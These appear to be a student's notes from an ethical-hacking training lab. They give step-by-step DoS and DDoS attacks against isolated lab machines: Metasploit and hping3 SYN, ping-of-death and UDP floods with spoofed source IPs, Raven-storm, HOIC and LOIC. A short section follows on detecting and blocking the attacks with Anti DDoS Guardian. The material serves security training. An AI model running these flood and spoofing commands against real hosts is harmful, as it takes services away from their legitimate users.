

# Lab 1: Perform DoS and DDoS Attacks using Various Techniques

**Overview of DoS and DDoS Attacks**

DDoS attacks mainly aim at the network bandwidth; they exhaust network, application, or service resources, and thereby restrict legitimate users from accessing their system or network resources.

In general, the following are categories of DoS/DDoS attack vectors:

- **Volumetric Attacks**: Consume the bandwidth of the target network or service

  Attack techniques:

    - UDP flood attack
    - ICMP flood attack
    - Ping of Death and smurf attack
    - Pulse wave and zero-day attack
- **Protocol Attacks**: Consume resources like connection state tables present in the network infrastructure components such as load-balancers, firewalls, and application servers

  Attack techniques:

    - SYN flood attack
    - Fragmentation attack
    - Spoofed session flood attack
    - ACK flood attack
- **Application Layer Attacks**: Consume application resources or services, thereby making them unavailable to other legitimate users

  Attack techniques:

    - HTTP GET/POST attack
    - Slowloris attack
    - UDP application layer flood attack
    - DDoS extortion attack

## Tasks 1: Perform a DoS Attack (SYN Flooding) on a Target Host using Metasploit

	[parrot]
	sudo su
	cd
	
	nmap -p 21 10.10.1.11
	displaying the port status as open
Now, we will perform SYN flooding on the target machine (**Windows 11**) using port 21, by spoofing the IP address of the **Parrot Security** machine with that of the Windows Server 2019

	msfconsole
	use auxiliary/docs/tcp/synflood
	show options
	set RHOST 10.10.1.11
	set RPORT 21
	set SHOST 10.10.1.19 (Spoofable IP Address)
	exploit

	[windows 11]
	observer behaviors in wireshark. Here, you can observe that the Source IP address is that of the Windows Server 2019 (10.10.1.19) machine. This implies that the IP 
	address of the Parrot Security machine has been spoofed.

	[parrot]
	ctlr+c -> stop flooding
---
## Task 2: Perform a DoS Attack on a Target Host using hping3

hping3 is a command-line-oriented network scanning and packet crafting tool for the TCP/IP protocol that sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols.

	[windows 11]
	launch wireshark, keep running

	[parrot]
	sudo su
	cd
SYN flood:

	hping3 -S (Target IP Address) -a (Spoofable IP Address) -p 22 --flood**
	hping3 -S 10.10.1.11 -a 10.10.1.19 -p 22 --flood
	Note: -S: sets the SYN flag; -a: spoofs the IP address; -p: specifies the destination port; and --flood: sends a huge number of packets.
	Ctrl + c
	Note: If you send the SYN packets for a long period, then the target system may crash.

	[Windows 11]
	observe the traffic for TCP-SYN packets
	Statistics -> I/O graph
	close
PoD attack:

	hping3 -d 65538 -S -p 21 --flood 10.10.1.11
	Note: -d: specifies data size; -S: sets the SYN flag; -p: specifies the destination port; and --flood: sends a huge number of packets.

	Note: In a PoD attack, the attacker tries to crash, freeze, or destabilize the targeted system or service by sending malformed or oversized packets using a simple 
	ping command.
	Note:For example, the attacker sends a packet that has a size of 65,538 bytes to the target web server. This packet size exceeds the size limit prescribed by RFC 
	791 IP, which is 65,535 bytes. The receiving system’s reassembly process might cause the system to crash.

UDP application layer flood attacks:

	nmap -p 139 10.10.1.19    
		Here, we will use NetBIOS port 139 to perform a UDP application layer flood attack.
	hping3 -2 -p 139 --flood 10.10.1.19
		Note:-2: specifies the UDP mode; -p: specifies the destination port; and --flood: sends a huge number of packets.
	
	[Win server 2019]
	observe wireshark traffic

	[parrot]
	ctrl +c

Note: Here, we have used NetBIOS port 139 to perform a UDP application layer flood attack. Similarly, you can employ other application layer protocols to perform a UDP application layer flood attack on a target network.

Note: Some of the UDP based application layer protocols that attackers can employ to flood target networks include:

Note: - CharGEN (Port 19)

	SNMPv2 (Port 161)
	QOTD (Port 17)
	RPC (Port 135)
	SSDP (Port 1900)
	CLDAP (Port 389)
	TFTP (Port 69)
	NetBIOS (Port 137,138,139)
	NTP (Port 123)
	Quake Network Protocol (Port 26000)
	VoIP (Port 5060)
------------------------------------------------------------------------
## Task 3: Perform a DoS Attack using Raven-storm

	[parrot]
	sudo su
	sudo rst
	Type l4 and press Enter to load layer4 module (UDP/TCP).

	[Win 19]
	wireshark

	[parrot]
	ip 10.10.1.19 -> specify target ip
	port 80
	threads 20000
	run
	Y -> Do you agree to the terms of use (Y/N)
	
	DDOS attack will start
	[Win server 2019]
	monitor wireshark
	[parrot]
	CTRL +z -> to stop DDoS attack.

------------------------------------------------------------------------
## Task 4: Perform a DDoS Attack using HOIC
Note: In this task, we will use the Windows 11, Windows Server 2019 and Windows Server 2022 machines to launch a DDoS attack on the Parrot Security machine.

	[parrot]
	Launch wireshark
	
	[Win 11]
	Copy the High Orbit Ion Cannon (HOIC) folder to Desktop.
	HOIC GUI main window appears; click the “+” button below the TARGETS section.
	Type the target URL such as http://10.10.1.13
	Slide the Power bar to High. Under the Booster section, select GenericBoost.hoic from the drop-down list, and click Add.
	Set the THREADS value to 20
	
	Follow same steps on Win server 2019  & Win server 22 machine
	
	click the FIRE TEH LAZER! button to initiate the DDoS attack on the target the Parrot Security machine.
	
	Observe that Wireshark starts capturing a large volume of packets, which means that the machine is experiencing a huge number of incoming packets. These packets are coming from the Windows 11, Windows Server 2019, and Windows Server 2022 machines.
	
	click FIRE TEH LAZER! again, and then close the HOIC window on all the attacker machines. Also, close the Wireshark window on the Parrot Security machine.
----
## Task 5: Perform a DDoS Attack using LOIC

**Low Orbit Ion Cannon (LOIC)** and double-click **LOIC.exe**.

	[Win 11, 2019, 22]
	- Under the Select your target section, type the target IP address under the IP field (here, 10.10.1.13), and then click the Lock on button to add 
	the target devices.
    - Under the Attack options section, select UDP from the drop-down list in Method. Set the thread's value to 10 under the Threads field. Slide 
    the power bar to the middle.

	[parrot]
	 launch wireshark

	[win 11, 2019, 22]
	stop flooding
----
# Lab 2: Detect and Protect Against DoS and DDoS Attacks
## Task 1: Detect and Protect Against DDoS Attacks using Anti DDoS Guardian
We will use the Windows Server 2019 and Windows Server 2022 machines to perform a DDoS attack on the target system, Windows 11.

	[Windows 11]
	
	Run Anti_DDoS_Guardian_setup.exe
	uncheck the install Stop RDP Brute Force option
	Create a desktop shortcut option
	Ready to Install wizard appears; click Install.
	uncheck the Launch Mini IP Blocker option and click Finish.
	
	Click Show hidden icons from the bottom-right corner of Desktop and click the Anti DDoS Guardian icon.
	The Anti DDoS Guardian window appears, displaying information about incoming and outgoing traffic.
		
	[Windows Server 2019]/[Win 22]
	Low Orbit Ion Cannon (LOIC) and double-click LOIC.exe.
	Follow same steps as above for LOIC
	
	[Win 11]
	
	observe the packets captured by Anti DDoS Guardian.
	Double-click any of the sessions 10.10.1.19 or 10.10.1.22.
	You can use various options from the left-hand pane such as Clear, Stop Listing, Block IP, and Allow IP. Using the Block IP option blocks the IP address sending the 
	huge number of packets.
	
	In the Traffic Detail Viewer window, click Block IP option from the left pane.
	Observe that the blocked IP session turns red in the Action Taken column.